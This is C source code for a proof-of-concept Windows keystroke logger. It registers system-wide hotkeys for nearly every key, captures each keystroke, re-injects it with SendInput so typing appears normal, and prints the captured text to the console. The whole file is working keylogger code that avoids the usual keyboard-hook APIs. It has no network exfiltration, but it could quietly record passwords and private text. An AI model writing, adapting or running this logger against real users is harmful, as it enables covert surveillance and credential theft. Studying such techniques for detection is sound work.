/*
    PoC Windows specific keystroke logger using only hotkeys

    The RegisterHotKey function:
        "Defines a system-wide hot key...When a key is pressed, the system looks for a match
        against all hot keys. Upon finding a match, the system posts the WM_HOTKEY message to 
        the message queue of the window with which the hot key is associated. If the hot key 
        is not associated with a window, then the WM_HOTKEY message is posted to the thread 
        associated with the hot key...RegisterHotKey fails if the keystrokes specified for the 
        hot key have already been registered by another hot key...If a hot key already exists 
        with the same hWnd and id parameters, it is maintained along with the new hot key. The 
        application must explicitly call UnregisterHotKey to unregister the old hot key"

    The SHIFT, ALT, CTRL, and CAPSLOCK keys (and more), aren't able to be captured by themselves
    unless they are part of a combination or other.

*/

#include <windows.h>
#include <stdio.h>


#pragma comment(linker, "/SUBSYSTEM:CONSOLE")


#define MOD_NOREPEAT 0x4000


unsigned ids;
unsigned shift_ids;
unsigned single_ids;


void CleanUp()
{
    unsigned i;
    for (i=0; i<ids; i++)
    {
        if (!UnregisterHotKey(NULL, i))
            wprintf(L"UnregisterHotKey ERROR: %d, ID: 0x%X\n", GetLastError(), i);
    }
}

void SetKeys(unsigned VKCOUNT, UINT fsModifiers, UINT VKSTART)
{
    unsigned i;
    for (i=0; i<VKCOUNT; i++)
    {
        if (!RegisterHotKey(NULL, ids++, fsModifiers, VKSTART+i))
            wprintf(L"RegisterHotKey ERROR: %d, VK: 0x%X\n", GetLastError(), VKSTART+i);
    }
}

void Init()
{
    /* Single Keys */
    SetKeys(26, MOD_NOREPEAT, 0x41);                   // a-z
    SetKeys(10, MOD_NOREPEAT, 0x30);                   // 0-9
    SetKeys(7,  MOD_NOREPEAT, 0xBA);                   // ';', '=', ',', '-', '.', '/', '`'
    SetKeys(4,  MOD_NOREPEAT, 0xDB);                   // '[', '\', ']', '''
    SetKeys(1,  MOD_NOREPEAT, VK_SPACE);
    SetKeys(1,  MOD_NOREPEAT, VK_BACK);
    SetKeys(1,  MOD_NOREPEAT, VK_TAB);
    SetKeys(1,  MOD_NOREPEAT, VK_RETURN);
    SetKeys(16, MOD_NOREPEAT, 0x60);                   // Numpad 0-9, ., *, /, -, +, enter

    single_ids=ids;

    /* Shifted Keys */
    SetKeys(1,  MOD_SHIFT | MOD_NOREPEAT, VK_SPACE);
    SetKeys(1,  MOD_SHIFT | MOD_NOREPEAT, VK_BACK);
    SetKeys(1,  MOD_SHIFT | MOD_NOREPEAT, VK_TAB);
    SetKeys(1,  MOD_SHIFT | MOD_NOREPEAT, VK_RETURN);
    SetKeys(26, MOD_SHIFT | MOD_NOREPEAT, 0x41);       // A-Z
    SetKeys(10, MOD_SHIFT | MOD_NOREPEAT, 0x30);       // )-!
    SetKeys(7,  MOD_SHIFT | MOD_NOREPEAT, 0xBA);       // ':', '+', '<', '_', '>', '?', '~', 
    SetKeys(4,  MOD_SHIFT | MOD_NOREPEAT, 0xDB);       // '{', '|', '}', '"'

    shift_ids=ids;

    wprintf(L"\n\t- Log Start - \n");
}

void wmain()
{
    ids=0;

    if (!RegisterHotKey(NULL, ids++, MOD_NOREPEAT, VK_ESCAPE))
        ExitProcess(1);

    Init();

    BYTE  KeyState[256] = { 0 };
    UINT  scanCode;
    WCHAR Key[2];

    INPUT in;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        if (msg.message==WM_HOTKEY)
        {
            if (HIWORD(msg.lParam)==VK_ESCAPE)
            {
                CleanUp();
                wprintf(L"\n\t-  Log End  -\n");
                break;
            }
            else
            {
                // Capture the SHIFT and CAPSLOCK key states for conversions later on
                GetKeyboardState(KeyState);
                KeyState[VK_SHIFT]   = (BYTE)GetKeyState(VK_SHIFT);
                KeyState[VK_CAPITAL] = (BYTE)GetKeyState(VK_CAPITAL);

                // Unregister the hotkey before forwarding the input to prevent a feedback loop
                UnregisterHotKey(NULL, msg.wParam);
                scanCode             = MapVirtualKeyW(HIWORD(msg.lParam), MAPVK_VK_TO_VSC);
                in.type              = INPUT_KEYBOARD;
                in.ki.wVk            = HIWORD(msg.lParam);
                in.ki.wScan          = scanCode;
                in.ki.dwFlags        = 0;
                in.ki.time           = 0;
                in.ki.dwExtraInfo = (ULONG_PTR)0;
                SendInput(1, &in, sizeof(INPUT));

                // Re-register the hotkey to continue capturing it.
                if (msg.wParam >= single_ids)
                {
                    if (!RegisterHotKey(NULL, msg.wParam, MOD_SHIFT|MOD_NOREPEAT, HIWORD(msg.lParam)))
                        wprintf(L"\nCould not re-register 0x%X\n", HIWORD(msg.lParam));                 
                }
                else if (!RegisterHotKey(NULL, msg.wParam, MOD_NOREPEAT, HIWORD(msg.lParam)))
                {
                    wprintf(L"\nCould not re-register 0x%X\n", HIWORD(msg.lParam));
                }

                switch(HIWORD(msg.lParam))
                {
                    // ...

                    case VK_RETURN:
                        wprintf(L"\n");
                        break;
                    default:
                        ToUnicode(HIWORD(msg.lParam), scanCode, KeyState, Key, 2, 0);
                        Key[1]=L'\0';
                        wprintf(L"%s", Key);
                        break;
                }
            }
        }
    }

    FlushFileBuffers(GetStdHandle(STD_INPUT_HANDLE));

    ExitProcess(0);
}
